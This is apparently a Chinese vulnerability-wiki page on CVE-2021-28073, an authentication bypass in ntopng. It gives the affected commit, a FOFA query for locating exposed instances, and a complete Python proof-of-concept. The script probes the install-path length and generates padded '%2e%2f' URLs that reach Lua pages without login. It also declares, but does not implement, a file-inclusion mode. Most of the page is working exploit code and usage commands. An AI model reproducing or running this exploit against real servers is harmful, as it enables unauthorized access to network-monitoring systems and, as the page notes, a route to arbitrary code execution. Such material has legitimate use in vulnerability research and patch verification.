<h1 id="HongKe-ntopng-流量分析系统-权限绕过漏洞-CVE-2021-28073"><a href="#HongKe-ntopng-流量分析系统-权限绕过漏洞-CVE-2021-28073" class="headerlink" title="HongKe ntopng 流量分析系统 权限绕过漏洞 CVE-2021-28073"></a>HongKe ntopng 流量分析系统 权限绕过漏洞 CVE-2021-28073</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p> ntopng是一款基于Web的流量分析与集流工具。2021年3月24日，阿里云应急响应中心监测到国内某安全团队公开披露 ntopng 权限绕过与任意代码执行漏洞，其CVE号为 CVE-2021-28073、CVE-2021-28074。攻击者可构造恶意请求，绕过相关认证，配合相关功能造成任意代码执行，控制服务器。</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
<p>[!NOTE]</p>
<p>ntopng commit &lt; e8b9721479f401f595c5c7bb151819aceb03ad71</p>
</blockquote>
<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
<p>[!NOTE]</p>
<p>app=”ntopng”</p>
</blockquote>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="漏洞利用POC"><a href="#漏洞利用POC" class="headerlink" title="漏洞利用POC"></a>漏洞利用POC</h2><pre><code>计算出ntopng lua目录的长度
python3 poc.py --url http://192.168.204.131:3000/ baselength

生成越权访问URL
python3 poc.py --url http://192.168.204.131:3000/ generate -l 36 -p find_prefs.lua
</code></pre>
<pre><code class="python">import sys
import requests
import argparse
import logging
 
 
def is_ntopng() -&gt; bool:
    response = session.get(base_url, allow_redirects=False)
    return response.status_code == 302 and &#39;/lua/login.lua&#39; in response.headers.get(&#39;Location&#39;, &#39;&#39;)
 
 
def get_base_length() -&gt; int:
    for i in range(90, 120):
        url = base_url + &#39;/lua/&#39; + &#39;%2e%2f&#39; * i + &#39;as_stats.lua.css&#39;
        response = session.get(url, allow_redirects=False)
        if response.status_code &lt; 300:
            return 255 - 1 - i * 2 - len(&#39;as_stats.lua&#39;)
 
    for i in range(90, 120):
        url = base_url + &#39;/lua/&#39; + &#39;%2e%2f&#39; * i + &#39;get_macs_data.lua.css&#39;
        response = session.get(url, allow_redirects=False)
        if response.status_code &lt; 300:
            return 255 - 1 - i * 2 - len(&#39;get_macs_data.lua&#39;)
 
    return -1
 
 
def get_padding_length(path: str):
    padding_length = 255 - 1 - base_length - len(path)
    if padding_length % 2 == 1:
        raise RuntimeError(f&#39;path {path} is not support&#39;)
 
    return int(padding_length / 2)
 
 
logging.basicConfig(stream=sys.stderr, level=logging.WARNING)
session = requests.Session()
session.headers[&#39;User-Agent&#39;] = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#39;
 
 
if __name__ == &#39;__main__&#39;:
    parser = argparse.ArgumentParser(description=&#39;CVE-2021-28073 POC for ntopng.&#39;)
    parser.add_argument(&#39;-u&#39;, &#39;--url&#39;, help=&#39;base url for ntopng, eg: http://192.168.1.233:3000&#39;, metavar=&#39;&lt;URL&gt;&#39;, required=True)
    parser.add_argument(&#39;-v&#39;, &#39;--verbose&#39;, default=False, action=&#39;store_true&#39;)
    
    subparsers = parser.add_subparsers(dest=&#39;action&#39;)
 
    baselength_command = subparsers.add_parser(&#39;baselength&#39;, help=&#39;get base path length of ntopng&#39;)
 
    generate_command = subparsers.add_parser(&#39;generate&#39;, help=&#39;generate the authenticate bypass url&#39;)
    generate_command.add_argument(&#39;-l&#39;, &#39;--length&#39;, type=int, help=&#39;base path length of target ntopng&#39;, metavar=&#39;&lt;LENGTH&gt;&#39;, required=True)
    generate_command.add_argument(&#39;-p&#39;, &#39;--path&#39;, help=&#39;lua pathname&#39;, metavar=&#39;&lt;PATH&gt;&#39;, required=True)
 
    generate_command = subparsers.add_parser(&#39;include&#39;, help=&#39;generate the arbitrary file inclusion url&#39;)
    generate_command.add_argument(&#39;-l&#39;, &#39;--length&#39;, type=int, help=&#39;base path length of target ntopng&#39;, metavar=&#39;&lt;LENGTH&gt;&#39;, required=True)
    generate_command.add_argument(&#39;-i&#39;, &#39;--include&#39;, help=&#39;path to include&#39;, metavar=&#39;&lt;PATH&gt;&#39;, required=True)
 
    args = parser.parse_args()
    if not args.action:
        parser.print_help()
        sys.exit(1)
 
    if args.verbose:
        logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
 
    base_url = args.url.rstrip(&#39;/&#39;)
    
    # check target
    if not is_ntopng():
        raise RuntimeError(&#39;No Ntopng detected&#39;)
 
    if args.action == &#39;baselength&#39;:
        base_length = get_base_length()
        sys.stdout.write(f&#39;ntopng install path length: {base_length}\n&#39;)
    elif args.action == &#39;generate&#39;:
        base_length = args.length
        path = args.path
        sys.stdout.write(base_url + &#39;/lua/&#39; + &#39;%2e%2f&#39; * get_padding_length(path) + path + &#39;.css\n&#39;)
</code></pre>
